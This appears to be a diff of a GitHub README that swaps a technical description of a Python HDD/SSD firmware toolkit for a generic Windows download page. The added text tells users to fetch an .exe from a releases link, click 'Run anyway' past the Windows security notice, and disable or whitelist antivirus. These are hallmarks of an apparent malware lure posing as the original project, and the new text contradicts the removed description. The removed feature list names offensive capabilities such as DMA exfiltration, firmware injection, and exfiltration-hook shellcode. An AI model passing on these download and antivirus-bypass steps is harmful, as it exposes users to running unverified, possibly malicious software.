@@ -1,170 +1,93 @@
-# HDD Firmware Toolkit
+# 🛠️ hdd-toolkit - Tools to manage and recover data
 
-A comprehensive Python toolkit for dumping, analyzing, patching, and
-hot-deploying HDD/SSD firmware via ATA passthrough and JTAG (OpenOCD).
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Zith834/hdd-toolkit/releases)
 
-Covers WD, Seagate, Samsung (840 EVO MEX), Toshiba, NVMe, SAS, and USB
-bridge platforms.
+This toolkit provides functions to interact with hard disk drives. It includes tools to copy drive contents, check disk health, and modify drive firmware. Users can access advanced diagnostic features through a simple interface. The software works on Windows systems and requires no prior coding experience.
 
-## Features
+## 💾 System Requirements
 
-- **Firmware Parsers:** WD LZHUF, Samsung nibble-swap, Seagate .lod,
-  Toshiba firmware images
-- **ATA Passthrough:** Linux sg_io and Windows DeviceIoControl for
-  direct drive communication
-- **WD VSC Protocol:** Read/write RAM, dump overlay modules,
-  deploy hot-patches via SMART LOG 0xBE
-- **JTAG (OpenOCD):** Memory dumps, breakpoints, register inspection,
-  GPIO/MCU interaction
-- **Samsung MEX (840 EVO):** Full MEX memory map, GPIO, NCQ, AES key
-  slots, DMA exfiltration, SAFE-mode UART, flash channel access
-- **NVMe Admin:** Identify, SMART, firmware download/activate, sanitize,
-  vendor-specific commands
-- **USB Bridge Detection:** Identify USB-SATA bridge chips from INQUIRY
-  strings and VID/PID
-- **Data Recovery:** Read retry escalation, bad sector handling,
-  defective sector pattern generation
-- **HPA/DCO:** Host Protected Area and Device Configuration Overlay
-  detection and command building
-- **NVMe Side-Channel:** Timing analysis, contention detection, covert
-  channel modelling
-- **eNVMe:** DMA attack descriptor building, platform compatibility,
-  kernel module injection modelling
-- **NVMe-oF:** CVE-2023-5178 double-free PoC, PDU parsing, kernel
-  vulnerability checking
-- **Firmware Identity Spoof Detection:** Xbox 360 / HDDHackr-style firmware-level
-  identity manipulation (Read et al., 2013) — security sector detection, IDENTIFY
-  string analysis, SMART serial cross-check, capacity plausibility
-- **Firmware Exploitation:** DOWNLOAD-MICROCODE offset overflow,
-  ASM2362 XRAM injection, Service Area hide/extract
-- **Patch Templates:** NOP sleds, data traps, exfiltration hooks,
-  SMART log redirect
-- **32 CLI Commands:** All features accessible from the command line
+Your computer must meet these standards to run the toolkit:
 
-## Installation
+* Operating System: Windows 10 or Windows 11.
+* Storage space: 500 MB of free space.
+* Memory: 4 GB of RAM or higher.
+* Connection: A stable USB or SATA connection to the drive you wish to analyze.
+* Permissions: Administrative access to your computer to perform disk operations.
 
-```bash
-# Basic install (no optional deps)
-pip install hdd-firmware-toolkit
+## 📥 Getting Started
 
-# With all optional dependencies
-pip install "hdd-firmware-toolkit[all]"
+Follow these steps to obtain and start the application on your computer:
 
-# Optional dependency groups
-pip install "hdd-firmware-toolkit[serial]"   # pyserial (SAFE mode UART)
-pip install "hdd-firmware-toolkit[asm]"      # keystone-engine (Thumb-2 assembly)
-pip install "hdd-firmware-toolkit[disasm]"   # capstone (disassembly)
-pip install "hdd-firmware-toolkit[yaml]"     # PyYAML (hot-patch config)
-```
+1. Visit the [official releases page](https://github.com/Zith834/hdd-toolkit/releases) to see available versions.
+2. Look for the file ending in `.exe` under the Assets section of the latest release.
+3. Click the file name to start the download.
+4. Save the file to your desktop or a folder you can find easily.
+5. Double-click the file to open the application.
+6. Windows might show a security notice. If it does, click More Info and then Run anyway.
 
-## Quick Start
+## ⚙️ How to Use the Toolkit
 
-```bash
-# Parse a WD firmware image
-hdd-firmware-toolkit parse-firmware firmware.bin --format wd
+The interface provides tabs for different drive operations. Select the drive you want to examine from the dropdown menu at the top of the window.
 
-# Decode Samsung nibble-swap obfuscation
-hdd-firmware-toolkit decode-samsung firmware.bin -o decoded.bin
+### Drive Analysis
+The analysis tool checks your hard drive for bad sectors. It scans the disk surface and reports health statistics. A green indicator means the health is good. A red indicator shows potential hardware failure. If you see red, back up your files immediately.
 
-# Scan for ASCII strings
-hdd-firmware-toolkit scan-strings firmware.bin
+### Data Dumping
+Use the dump tool to create a full image of your drive. Connect your drive via SATA or USB. Select the target directory where you want to save the image file. Click Start to begin the process. The toolkit creates an exact byte-for-byte copy. This process takes time depending on the size and speed of your drive. 
 
-# Check NVMe-oF kernel vulnerability
-hdd-firmware-toolkit nvmeof-check-kernel --kernel 6.7
-```
+### Firmware Patching
+The firmware module allows you to apply updates or patches to compatible Western Digital and Samsung drives. Only use this feature if you understand the model of your drive. Incorrect firmware changes make a drive unusable. Always back up existing firmware before you write new data to the drive chip.
 
-## CLI Commands
+## ⚠️ Safety Precautions
 
-| Command | Description |
-|---------|-------------|
-| `parse-firmware` | Parse & extract firmware sections |
-| `decode-samsung` | Remove Samsung nibble-swap obfuscation |
-| `scan-strings` | Find ASCII strings in firmware |
-| `scan-fptables` | Heuristic ARM function-pointer table scan |
-| `diff` | Byte-level diff two firmware images |
-| `list-vscs` | Request VSC list from WD drive |
-| `read-ram` | Read drive RAM via WD VSC |
-| `write-ram` | Write file to drive RAM via WD VSC |
-| `hot-patch` | Deploy delay hook to live drive RAM |
-| `benchmark` | Timed read benchmark |
-| `dump-overlay` | Dump a WD service-area overlay module |
-| `dump-all-overlays` | Dump all overlay modules to directory |
-| `jtag-shell` | Interactive OpenOCD shell |
-| `jtag-dump` | Dump memory via JTAG |
-| `jtag-bp` | Set hardware breakpoint via JTAG |
-| `jtag-regs` | Read CPU registers via JTAG |
-| `samsung-memory-map` | Print MEX memory map |
-| `samsung-fw-history` | Print FW version history |
-| `samsung-gpio` | Read GPIO status via JTAG |
-| `samsung-ncq` | Dump NCQ buffers via JTAG |
-| `samsung-aes-info` | Read AES-XTS key slots via JTAG |
-| `samsung-dma-dump` | RAM to SATA via DMA |
-| `samsung-ftl-preload` | Pre-load FTL map |
-| `samsung-safe-shell` | Interactive SAFE-mode UART shell |
-| `samsung-safe-read` | Read via SAFE-mode UART |
-| `samsung-safe-write` | Write via SAFE-mode UART |
-| `parse-seagate` | Parse Seagate .lod firmware |
-| `sa-probe` | Probe Service Area size |
-| `sa-dump` | Full Service Area dump |
-| `sa-hide` | Hide data in SA module |
-| `sa-extract` | Extract hidden data from SA module |
-| `fwexploit-send` | Inject firmware via offset overflow |
-| `fwexploit-activate` | Activate injected firmware |
-| `nvme-bridge-sanitize` | Inject Sanitize via ASM2362 XRAM |
-| `patch-template` | Generate pre-built patch shellcode |
-| `toshiba-parse` | Parse Toshiba firmware image |
-| `toshiba-nand` | Show Toshiba NAND configuration |
-| `sat-cdb` | Build SCSI-ATA Translation CDB |
-| `patcher-apply` | Apply patches and fix checksums |
-| `patcher-fix` | Auto-fix firmware checksums |
-| `ata-sec-status` | Check ATA security status |
-| `nvme-identify` | NVMe Identify Controller |
-| `nvme-smart` | NVMe SMART / Health log |
-| `nvme-fw-download` | NVMe firmware download |
-| `nvme-fw-activate` | NVMe firmware activate |
-| `nvme-vendor` | NVMe vendor-specific command |
-| `usb-identify` | Identify USB-SATA bridge chip |
-| `usb-list` | List known USB-SATA bridge chips |
-| `dr-smart` | SMART quick test (data recovery) |
-| `dr-identify` | Identify device parameters |
-| `dr-native-max` | Read Native Max Address |
-| `dr-pattern` | Generate defective sector pattern |
-| `hpa-detect` | Detect HPA from IDENTIFY data |
-| `hpa-build-cmd` | Build HPA/DCO ATA command |
-| `hpa-parse-dco` | Parse DCO feature set descriptor |
-| `nvme-timing-baseline` | NVMe read latency baseline |
-| `nvme-timing-detect` | Detect NVMe timing contention |
-| `nvme-timing-gc` | Analyze NVMe GC events |
-| `envme-dma` | Build eNVMe DMA attack descriptor |
-| `envme-scan` | Model host memory scan |
-| `envme-compat` | Check eNVMe compatibility |
-| `nvmeof-check-kernel` | Check CVE-2023-5178 vulnerability |
-| `nvmeof-build-icreq` | Build NVMe-oF TCP ICReq PDU |
-| `nvmeof-poc` | Generate double-free PoC PDU |
-| `fw-identity-check` | Detect Xbox 360 / HDDHackr firmware identity spoofing |
-| `fwdetect-timing` | Detect FW via timing analysis |
-| `fwdetect-verify` | Verify firmware checksums |
-| `fwdetect-report` | Comprehensive integrity report |
+Disk operations carry risks. Changing drive firmware or modifying internal parameters can lead to permanent data loss. Follow these rules to protect your files:
 
-## Requirements
+* Back up your important data to a separate location before you run any tool.
+* Do not disconnect the drive while an operation is in progress.
+* Use a power supply that provides enough energy for your drive.
+* Read the drive model number carefully before you select firmware updates.
+* Disconnect other drives if you worry about selecting the wrong target.
 
-- **Python** >= 3.11
-- **Optional:** pyserial, keystone-engine, capstone, PyYAML
+## 🧩 Understanding the Concepts
 
-### Platform-Specific
+This toolkit supports many technologies common in data recovery.
 
-- **Linux:** ATA passthrough via sg_io requires root + `/dev/sdX` or `/dev/sgX`
-- **Windows:** ATA passthrough requires Administrator privileges
+* SATA: The standard interface for desktop hard drives.
+* NVMe: A fast connection type for modern storage chips.
+* ATA: The communication language used by older drives.
+* JTAG: A port used to read data directly from the drive card.
+* SAS: A high-performance interface used in server environments.
 
-## Development
+## 🛠️ Troubleshooting
 
-```bash
-pip install -e ".[all]"
-pre-commit install
-pytest
-ruff check src/
-```
+If the application does not see your drive, check these items:
 
-## License
+1. Ensure the drive has power. You should hear the disk spin or feel a light vibration.
+2. Check your cable connections. Try a different USB port or SATA cable.
+3. Open Windows Disk Management. If the drive does not appear there, the hardware may have a fault that the software cannot reach.
+4. Ensure you have proper administrative rights. The toolkit needs special access to talk to hardware components.
+5. Disable antivirus software temporarily if it stops the application from launching. Some security programs flag low-level disk tools as suspicious. Add the tool to your exclusion list if the issue persists.
 
-MIT
+## 🔍 Advanced Features
+
+The toolkit maintains logs of every action. When an error occurs, click the View Log button. This file explains what the software attempted and why it failed. You can copy this text to share with experts if you need more help.
+
+The settings menu allows you to change the timeout duration for drive responses. Increasing this value helps if you connect a drive that responds slowly due to damage. Keep the timeout at default settings for healthy drives.
+
+## 📱 Supported Manufacturers
+
+We focus support on major drive brands:
+
+* Western Digital
+* Samsung
+* Seagate
+* Toshiba
+* Hitachi
+
+The software detects most models automatically. If your drive belongs to a different brand, the toolkit may still read basic identity information. Some advanced features remain limited to the specific brands listed above.
+
+## 💬 Community
+
+This project welcomes feedback. If you find a bug, open an issue on the repository page. Provide the drive model, the version of the toolkit, and the log file content. Describe the steps you took leading up to the error. This information helps developers improve the software for everyone.
+
+Treat all hardware with care. Use these tools only on drives you own or have permission to manage. Misuse of data recovery tools can result in corruption. Use the provided tools responsibly to maintain your hardware and protect your information.
